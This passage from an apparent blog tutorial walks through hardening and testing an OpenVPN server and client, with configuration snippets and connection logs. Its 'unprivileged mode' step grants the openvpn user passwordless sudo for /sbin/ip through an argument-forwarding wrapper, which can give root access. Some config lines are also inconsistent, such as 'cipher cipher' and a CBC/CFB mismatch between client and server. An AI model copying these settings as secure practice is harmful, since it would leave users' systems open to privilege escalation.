;cipher AES-128-CBC   <span style="color:#999;font-style:italic"># AES</span>
;cipher DES-EDE3-CBC  <span style="color:#999;font-style:italic"># Triple-DES</span>
cipher AES-256-CBC
</code></pre></div><h3 id="select-tls-cipher">Select TLS cipher</h3>
<p>In order to guarantee <a href="https://en.wikipedia.org/wiki/Forward_secrecy">FPS</a> I&rsquo;ll be using a <strong>Diffieâ€“Hellman key exchange-based PFS</strong> like <strong>DHE-[&hellip;]</strong> or an <strong>elliptic curve Diffieâ€“Hellman-based PFS</strong> like <strong>ECDHE-[&hellip;]</strong>. As stated <a href="https://community.openvpn.net/openvpn/wiki/Hardening#Useof--tls-cipher">here</a> OpenVPN does not support TLS-ECDHE-* or more exotic cipher-suites as there is no elliptic curve support currently.</p>
<p>Let&rsquo;s have a look at the available <strong>TLS ciphers</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# openvpn --show-tls | grep TLS-DHE
TLS-DHE-DSS-WITH-AES-256-GCM-SHA384
TLS-DHE-RSA-WITH-AES-256-GCM-SHA384
TLS-DHE-RSA-WITH-AES-256-CBC-SHA256
TLS-DHE-DSS-WITH-AES-256-CBC-SHA256
TLS-DHE-RSA-WITH-AES-256-CBC-SHA
TLS-DHE-DSS-WITH-AES-256-CBC-SHA
TLS-DHE-RSA-WITH-CAMELLIA-256-CBC-SHA
TLS-DHE-DSS-WITH-CAMELLIA-256-CBC-SHA
TLS-DHE-DSS-WITH-AES-128-GCM-SHA256
TLS-DHE-RSA-WITH-AES-128-GCM-SHA256
TLS-DHE-RSA-WITH-AES-128-CBC-SHA256
TLS-DHE-DSS-WITH-AES-128-CBC-SHA256
TLS-DHE-RSA-WITH-AES-128-CBC-SHA
TLS-DHE-DSS-WITH-AES-128-CBC-SHA
TLS-DHE-RSA-WITH-SEED-CBC-SHA
TLS-DHE-DSS-WITH-SEED-CBC-SHA
TLS-DHE-RSA-WITH-CAMELLIA-128-CBC-SHA
TLS-DHE-DSS-WITH-CAMELLIA-128-CBC-SHA
TLS-DHE-RSA-WITH-3DES-EDE-CBC-SHA
TLS-DHE-DSS-WITH-3DES-EDE-CBC-SHA
TLS-DHE-RSA-WITH-DES-CBC-SHA
TLS-DHE-DSS-WITH-DES-CBC-SHA
</code></pre></div><p>Add <strong>some</strong> ciphers to the config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Select a TLS cipher</span>
tls-cipher TLS-DHE-RSA-WITH-AES-256-CBC-SHA256:TLS-DHE-RSA-WITH-AES-128-CBC-SHA256:TLS-DHE-DSS-WITH-AES-128-CBC-SHA256:TLS-DHE-RSA-WITH-AES-128-CBC-SHA
</code></pre></div><p>Additionally you can specify which <strong>TLS version</strong> should be used</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Use TLS 1.2 as minimum requirement</span>
tls-version-min 1.2
</code></pre></div><h3 id="use-sha2-for-message-authentication">Use SHA2 for message authentication</h3>
<p>In case you don&rsquo;t have performance issues, change the the MAC digest to:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">auth SHA512
</code></pre></div><h3 id="verify-revoked-client-certs">Verify revoked client certs</h3>
<p>Also make sure that no client with a revoked certificate is allowed to connect to the VPN server:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">crl-verify path-to/your-ca-crl.pem
</code></pre></div><h3 id="route-all-client-traffic-incl-dns-through-vpn-tunnel">Route all client traffic (incl. DNS) through VPN tunnel</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">push <span style="color:#ed9d13">&#34;redirect-gateway def1&#34;</span>
</code></pre></div><p>Pushing this option to the clients will route all client originating traffic through the OpenVPN server. The server however must know how to deal with this traffic by <strong>NAT</strong>ing it to the Internet or passing it to some <strong>proxy</strong>. <strong>DNS</strong> traffic will be routed as well. You may want to <em>push</em> some DNS server to the clients, such as:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">push <span style="color:#ed9d13">&#34;dhcp-option DNS 208.67.222.222&#34;</span>
push <span style="color:#ed9d13">&#34;dhcp-option DNS 8.8.8.8&#34;</span>
</code></pre></div><h3 id="make-other-subnets-available-to-the-clients">Make other subnets available to the clients</h3>
<p>In order to allow VPN clients to access subnets behind the VPN-gateway you&rsquo;ll have to advertise these subnets to the clients. One example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Push routes to the client to allow it</span>
<span style="color:#999;font-style:italic"># to reach other private subnets behind</span>
<span style="color:#999;font-style:italic"># the server.  Remember that these</span>
<span style="color:#999;font-style:italic"># private subnets will also need</span>
<span style="color:#999;font-style:italic"># to know to route the OpenVPN client</span>
<span style="color:#999;font-style:italic"># address pool (10.8.0.0/255.255.255.0)</span>
<span style="color:#999;font-style:italic"># back to the OpenVPN server.</span>
push <span style="color:#ed9d13">&#34;route 192.168.178.0 255.255.255.0&#34;</span>
</code></pre></div><p>More on <strong>Routing</strong> in the section below.</p>
<h2 id="harden-server">Harden server</h2>
<h3 id="move-it-to-chroot">Move it to chroot</h3>
<p>In a <strong>chroot</strong> environment a process/daemon would not be able to access any part of the system&rsquo;s filesystem except for the directory it is currently in.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# mkdir -p /home/openvpn/tmp
root@debian:/etc/openvpn# chown -R openvpn:openvpn /home/openvpn
</code></pre></div><p>Also add to the config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Lock down daemon to chroot jail</span>
chroot jail
</code></pre></div><h3 id="dont-run-as-root">Don&rsquo;t run as root</h3>
<p>Reduce OpenVPN&rsquo;s server privileges:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># It&#39;s a good idea to reduce the OpenVPN</span>
<span style="color:#999;font-style:italic"># daemon&#39;s privileges after initialization.</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># You can uncomment this out on</span>
<span style="color:#999;font-style:italic"># non-Windows systems.</span>
user openvpn
group openvpn
</code></pre></div><h3 id="unprivileged-mode">Unprivileged mode</h3>
<p>While being able to operate on a <code>tun</code> device, the OpenVPN daemon should be able to access it in an unprivileged mode. Internally <code>sudo</code> is being used to call <code>iproute</code> which will apply the interface properties and add/delete/modify routing information. For getting this to work I&rsquo;ll use the described steps in the <a href="https://openvpn.net/index.php/open-source/documentation/howto.html">official documentation</a>:</p>
<ul>
<li>Create a new script</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# cat /usr/local/sbin/unpriv-ip 
<span style="color:#999;font-style:italic">#!/bin/sh</span>
sudo /sbin/ip <span style="color:#40ffff">$*</span>
root@debian:/etc/openvpn# chmod a+x /usr/local/sbin/unpriv-ip
</code></pre></div><ul>
<li>Allow <code>user1</code> to execute <code>/sbin/ip</code> (in <code>/etc/sudoers</code>):</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Allow user1 nobody to execute /sbin/ip</span>
openvpn <span style="color:#40ffff">ALL</span>=(ALL)  NOPASSWD: /sbin/ip
</code></pre></div><ul>
<li>Change OpenVPN configuration</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Set  alternate command to execute instead of default iproute2 command.</span>
iproute /usr/local/sbin/unpriv-ip
</code></pre></div><h3 id="check-file-permissions">Check file permissions</h3>
<p>Also check the file permissions for the file inside <code>/etc/openvpn</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# chmod go-rwx /etc/openvpn/ta.key /etc/openvpn/dh2048.pem /etc/openvpn/certs/raspberry_pi.p12
</code></pre></div><h3 id="disable-password--caching">Disable password  caching</h3>
<p>You might get some warning like</p>
<blockquote>
<p>WARNING: this configuration may cache passwords in memory &ndash; use the auth-nocache option to prevent this</p>
</blockquote>
<p>Then add it fo the conf:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Prevent password caching</span>
auth-nocache
</code></pre></div><h2 id="start-server">Start server</h2>
<p>Let&rsquo;s give it a try:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/etc/openvpn# openvpn server.conf 
Tue Nov <span style="color:#3677a9">17</span> 17:30:12 <span style="color:#3677a9">2015</span> OpenVPN 2.3.4 arm-unknown-linux-gnueabihf [SSL (OpenSSL)] [LZO] [EPOLL] [PKCS11] [MH] [IPv6] built on Dec  <span style="color:#3677a9">5</span> <span style="color:#3677a9">2014</span>
...

Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> Control Channel Authentication: using <span style="color:#ed9d13">&#39;ta.key&#39;</span> as a OpenVPN static key file
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> Outgoing Control Channel Authentication: Using <span style="color:#3677a9">512</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA512&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> Incoming Control Channel Authentication: Using <span style="color:#3677a9">512</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA512&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> Socket Buffers: <span style="color:#40ffff">R</span>=[163840-&gt;131072] <span style="color:#40ffff">S</span>=[163840-&gt;131072]
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> ROUTE_GATEWAY 192.168.178.1/255.255.255.0 <span style="color:#40ffff">IFACE</span>=eth0 <span style="color:#40ffff">HWADDR</span>=b8:27:eb:5c:0a:5d
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> TUN/TAP device tun0 opened
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> TUN/TAP TX queue length <span style="color:#24909d">set</span> to <span style="color:#3677a9">100</span>
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> do_ifconfig, tt-&gt;ipv6=0, tt-&gt;did_ifconfig_ipv6_setup=<span style="color:#3677a9">0</span>
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> /usr/local/sbin/unpriv-ip link <span style="color:#24909d">set</span> dev tun0 up mtu <span style="color:#3677a9">1500</span>
Tue Nov <span style="color:#3677a9">17</span> 17:30:16 <span style="color:#3677a9">2015</span> /usr/local/sbin/unpriv-ip addr add dev tun0 <span style="color:#24909d">local</span> 10.66.0.1 peer 10.66.0.2
Tue Nov <span style="color:#3677a9">17</span> 17:30:17 <span style="color:#3677a9">2015</span> /usr/local/sbin/unpriv-ip route add 10.66.0.0/24 via 10.66.0.2
Tue Nov <span style="color:#3677a9">17</span> 17:30:17 <span style="color:#3677a9">2015</span> chroot to <span style="color:#ed9d13">&#39;/home/openvpn&#39;</span> and <span style="color:#24909d">cd</span> to <span style="color:#ed9d13">&#39;/&#39;</span> succeeded
Tue Nov <span style="color:#3677a9">17</span> 17:30:17 <span style="color:#3677a9">2015</span> GID <span style="color:#24909d">set</span> to openvpn
Tue Nov <span style="color:#3677a9">17</span> 17:30:17 <span style="color:#3677a9">2015</span> UID <span style="color:#24909d">set</span> to openvpn
...
Tue Nov <span style="color:#3677a9">17</span> 17:30:17 <span style="color:#3677a9">2015</span> Initialization Sequence Completed


</code></pre></div><p>So everything seemed to work. Let&rsquo;s check some things:</p>
<ul>
<li>Process owner</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/home/victor# ps -efl | grep openvpn
<span style="color:#3677a9">4</span> S openvpn   <span style="color:#3677a9">9930</span>  <span style="color:#3677a9">1633</span>  <span style="color:#3677a9">0</span>  <span style="color:#3677a9">80</span>   <span style="color:#3677a9">0</span> -  <span style="color:#3677a9">1356</span>  e0778 17:30 pts/1    00:00:00 openvpn server.conf
</code></pre></div><ul>
<li>Opened files</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/home/victor# lsof | grep <span style="color:#3677a9">9930</span>
openvpn    <span style="color:#3677a9">9930</span>         openvpn  cwd       DIR      179,2     <span style="color:#3677a9">4096</span>        <span style="color:#3677a9">101</span> /home/openvpn
openvpn    <span style="color:#3677a9">9930</span>         openvpn  rtd       DIR      179,2     <span style="color:#3677a9">4096</span>        <span style="color:#3677a9">101</span> /home/openvpn

...
</code></pre></div><ul>
<li>Connectivity</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/home/openvpn# netstat -uptan | grep <span style="color:#3677a9">443</span>
udp        <span style="color:#3677a9">0</span>      192.168.178.163:443             0.0.0.0:*                           9930/openvpn    
</code></pre></div><p>Looks good.</p>
<h1 id="configure-client">Configure client</h1>
<h2 id="basic-configuration-1">Basic configuration</h2>
<p>Let&rsquo;s add the basic stuff:</p>
<ul>
<li>Specify we&rsquo;re operating in client mode</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Specify that we are a client and that we</span>
<span style="color:#999;font-style:italic"># will be pulling certain config file directives</span>
<span style="color:#999;font-style:italic"># from the server.</span>
client
</code></pre></div><ul>
<li>Specify TUN/TAP device for the client</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"> Use the same setting as you are using on
<span style="color:#999;font-style:italic"># the server.</span>
<span style="color:#999;font-style:italic"># On most systems, the VPN will not function</span>
<span style="color:#999;font-style:italic"># unless you partially or fully disable</span>
<span style="color:#999;font-style:italic"># the firewall for the TUN/TAP interface.</span>
;dev tap
dev tun
</code></pre></div><ul>
<li>Connection details</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Are we connecting to a TCP or</span>
<span style="color:#999;font-style:italic"># UDP server?  Use the same setting as</span>
<span style="color:#999;font-style:italic"># on the server.</span>
;proto tcp
proto udp

<span style="color:#999;font-style:italic"># The hostname/IP and port of the server.</span>
<span style="color:#999;font-style:italic"># You can have multiple remote entries</span>
<span style="color:#999;font-style:italic"># to load balance between the servers.</span>
;remote my-server-1 <span style="color:#3677a9">1194</span>
remote 10.0.1.169 <span style="color:#3677a9">443</span>

</code></pre></div><h3 id="secure-communication-channel-1">Secure communication channel</h3>
<ul>
<li>Specify previously generated client certificate and key</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"> SSL/TLS parms.
<span style="color:#999;font-style:italic"># See the server config file for more</span>
<span style="color:#999;font-style:italic"># description.  It&#39;s best to use</span>
<span style="color:#999;font-style:italic"># a separate .crt/.key file pair</span>
<span style="color:#999;font-style:italic"># for each client.  A single ca</span>
<span style="color:#999;font-style:italic"># file can be used for all clients.</span>
ca vpn-ca.crt
cert victor.crt
key victor.key
</code></pre></div><ul>
<li>Verify server certificate</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Verify server certificate by checking that the</span>
<span style="color:#999;font-style:italic"># certicate has the correct key usage set.</span>
<span style="color:#999;font-style:italic"># This is an important precaution to protect against</span>
<span style="color:#999;font-style:italic"># a potential attack discussed here:</span>
<span style="color:#999;font-style:italic">#  http://openvpn.net/howto.html#mitm</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># To use this feature, you will need to generate</span>
<span style="color:#999;font-style:italic"># your server certificates with the keyUsage set to</span>
<span style="color:#999;font-style:italic">#   digitalSignature, keyEncipherment</span>
<span style="color:#999;font-style:italic"># and the extendedKeyUsage to</span>
<span style="color:#999;font-style:italic">#   serverAuth</span>
<span style="color:#999;font-style:italic"># EasyRSA can do this for you.</span>
remote-cert-tls server
</code></pre></div><ul>
<li>Verify server&rsquo;s CN</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">verify-x509-name <span style="color:#ed9d13">&#39;C=NU, O=dornea.nu, OU=dornea.nu Root CA, CN=vpn.dornea.nu&#39;</span> subject
</code></pre></div><ul>
<li>Use <strong>tls-auth</strong> key (make sure you use the same one as on the server)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># If a tls-auth key is used on the server</span>
<span style="color:#999;font-style:italic"># then every client must also have the key.</span>
tls-auth ta.key <span style="color:#3677a9">1</span>
</code></pre></div><ul>
<li>Use SHA2 as MAC</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">auth SHA512
</code></pre></div><ul>
<li>Select cryptographic cipher (same as on the server)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Select a cryptographic cipher.</span>
<span style="color:#999;font-style:italic"># If the cipher option is used on the server</span>
<span style="color:#999;font-style:italic"># then you must also specify it here.</span>
cipher cipher AES-256-CFB
</code></pre></div><h2 id="test-connection">Test connection</h2>
<ul>
<li>Initial try (with errors, see below)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">OpenVPN 2.3_git [git:master/60fd44e501f20024+] x86_64-unknown-linux-gnu [SSL (OpenSSL)] [LZO] [SNAPPY] [LZ4] [EPOLL] [MH] [IPv6] built on Jun <span style="color:#3677a9">11</span> <span style="color:#3677a9">2015</span>
library versions: OpenSSL 1.0.2d <span style="color:#3677a9">9</span> Jul 2015, LZO 2.09
Enter Private Key Password: ******************
...
VERIFY ERROR: <span style="color:#40ffff">depth</span>=2, <span style="color:#40ffff">error</span>=self signed certificate in certificate chain: <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=dornea.nu Root CA, <span style="color:#40ffff">CN</span>=dornea.nu Root CA
OpenSSL: error:14090086:SSL routines:ssl3_get_server_certificate:certificate verify failed
TLS_ERROR: BIO <span style="color:#24909d">read</span> tls_read_plaintext error
TLS Error: TLS object -&gt; incoming plaintext <span style="color:#24909d">read</span> error
TLS Error: TLS handshake failed
...
</code></pre></div><p>We can see that the <strong>certificate verification</strong> has failed. So the client is not able to verify the certificate presented by the server because it doesn&rsquo;t have the <strong>root cert</strong>. Let&rsquo;s adapt the config:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># SSL/TLS parms.</span>
...
ca vpn-ca-chain.pem
...
</code></pre></div><p>Give it another try:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">OpenVPN 2.3_git [git:master/60fd44e501f20024+] x86_64-unknown-linux-gnu [SSL (OpenSSL)] [LZO] [SNAPPY] [LZ4] [EPOLL] [MH] [IPv6] built on Jun <span style="color:#3677a9">11</span> <span style="color:#3677a9">2015</span>
library versions: OpenSSL 1.0.2d <span style="color:#3677a9">9</span> Jul 2015, LZO 2.09
NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Enter Private Key Password: ******************
WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
Control Channel Authentication: using <span style="color:#ed9d13">&#39;ta.key&#39;</span> as a OpenVPN static key file
Outgoing Control Channel Authentication: Using <span style="color:#3677a9">512</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA512&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Incoming Control Channel Authentication: Using <span style="color:#3677a9">512</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA512&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
TCP/UDP: Preserving recently used remote address: [AF_INET]&lt;vpn-server&gt;:80
Socket Buffers: <span style="color:#40ffff">R</span>=[212992-&gt;131072] <span style="color:#40ffff">S</span>=[212992-&gt;131072]
UDP link local: (not bound)
UDP link remote: [AF_INET]&lt;vpn-server&gt;:80
TLS: Initial packet from [AF_INET]&lt;vpn-server&gt;, <span style="color:#40ffff">sid</span>=d4f744bb e391d690
VERIFY OK: <span style="color:#40ffff">depth</span>=2, <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=dornea.nu Root CA, <span style="color:#40ffff">CN</span>=dornea.nu Root CA
VERIFY OK: <span style="color:#40ffff">depth</span>=1, <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=dornea.nu Root CA, <span style="color:#40ffff">CN</span>=vpn.dornea.nu CA
Validating certificate key usage
++ Certificate has key usage  00a0, expects 00a0
VERIFY KU OK
Validating certificate extended key usage
++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
VERIFY EKU OK
VERIFY X509NAME OK: <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">ST</span>=/dev/null, <span style="color:#40ffff">L</span>=/dev/random, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=VPN, <span style="color:#40ffff">CN</span>=vpn.dornea.nu
VERIFY OK: <span style="color:#40ffff">depth</span>=0, <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">ST</span>=/dev/null, <span style="color:#40ffff">L</span>=/dev/random, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=VPN, <span style="color:#40ffff">CN</span>=vpn.dornea.nu
Data Channel Encrypt: Cipher <span style="color:#ed9d13">&#39;AES-256-CBC&#39;</span> initialized with <span style="color:#3677a9">256</span> bit key
Data Channel Encrypt: Using <span style="color:#3677a9">512</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA512&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Data Channel Decrypt: Cipher <span style="color:#ed9d13">&#39;AES-256-CBC&#39;</span> initialized with <span style="color:#3677a9">256</span> bit key
Data Channel Decrypt: Using <span style="color:#3677a9">512</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA512&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Control Channel: TLSv1.2, cipher TLSv1/SSLv3 DHE-RSA-AES256-SHA256, <span style="color:#3677a9">4096</span> bit RSA
[vpn.dornea.nu] Peer Connection Initiated with [AF_INET]&lt;vpn-server&gt;:80
SENT CONTROL [vpn.dornea.nu]: <span style="color:#ed9d13">&#39;PUSH_REQUEST&#39;</span> (<span style="color:#40ffff">status</span>=1)
PUSH: Received control message: <span style="color:#ed9d13">&#39;PUSH_REPLY,route 192.168.178.0 255.255.255.0,redirect-gateway def1,dhcp-option DNS 208.67.222.222,dhcp-option DNS 8.8.8.8,route 10.66.0.1,topology net30,ping 10,ping-restart 120,ifconfig 10.66.0.6 10.66.0.5&#39;</span>
OPTIONS IMPORT: timers and/or timeouts modified
OPTIONS IMPORT: --ifconfig/up options modified
OPTIONS IMPORT: route options modified
OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
ROUTE_GATEWAY 192.168.178.1/255.255.255.0 <span style="color:#40ffff">IFACE</span>=wlan0 <span style="color:#40ffff">HWADDR</span>=3c:77:e6:18:f9:65
TUN/TAP device tun0 opened
TUN/TAP TX queue length <span style="color:#24909d">set</span> to <span style="color:#3677a9">100</span>
do_ifconfig, tt-&gt;ipv6=0, tt-&gt;did_ifconfig_ipv6_setup=<span style="color:#3677a9">0</span>
/usr/bin/ip link <span style="color:#24909d">set</span> dev tun0 up mtu <span style="color:#3677a9">1500</span>
/usr/bin/ip addr add dev tun0 <span style="color:#24909d">local</span> 10.66.0.6 peer 10.66.0.5
/etc/openvpn/update-resolv-conf tun0 <span style="color:#3677a9">1500</span> <span style="color:#3677a9">1602</span> 10.66.0.6 10.66.0.5 init
2.222

/usr/bin/ip route add &lt;vpn-server&gt;/32 via 192.168.178.1
/usr/bin/ip route add 0.0.0.0/1 via 10.66.0.5
/usr/bin/ip route add 128.0.0.0/1 via 10.66.0.5
/usr/bin/ip route add 192.168.178.0/24 via 10.66.0.5
/usr/bin/ip route add 10.66.0.1/32 via 10.66.0.5
Initialization Sequence Completed
</code></pre></div><p>Looks good. What about the <strong>server</strong>?</p>
<ul>
<li>Server logs</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">TLS: Initial packet from [AF_INET]10.0.1.1:59824, <span style="color:#40ffff">sid</span>=230b4633 1fb1bfae
VERIFY OK: <span style="color:#40ffff">depth</span>=2, <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=dornea.nu Root CA, <span style="color:#40ffff">CN</span>=dornea.nu Root CA
VERIFY OK: <span style="color:#40ffff">depth</span>=1, <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=dornea.nu Root CA, <span style="color:#40ffff">CN</span>=vpn.dornea.nu CA
VERIFY OK: <span style="color:#40ffff">depth</span>=0, <span style="color:#40ffff">C</span>=NU, <span style="color:#40ffff">ST</span>=/dev/null, <span style="color:#40ffff">L</span>=/dev/random, <span style="color:#40ffff">O</span>=dornea.nu, <span style="color:#40ffff">OU</span>=vpn.dornea.nu, <span style="color:#40ffff">CN</span>=Victor Dorneanu
Data Channel Encrypt: Cipher <span style="color:#ed9d13">&#39;AES-256-CFB&#39;</span> initialized with <span style="color:#3677a9">256</span> bit key
Data Channel Encrypt: Using <span style="color:#3677a9">160</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA1&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Data Channel Decrypt: Cipher <span style="color:#ed9d13">&#39;AES-256-CFB&#39;</span> initialized with <span style="color:#3677a9">256</span> bit key
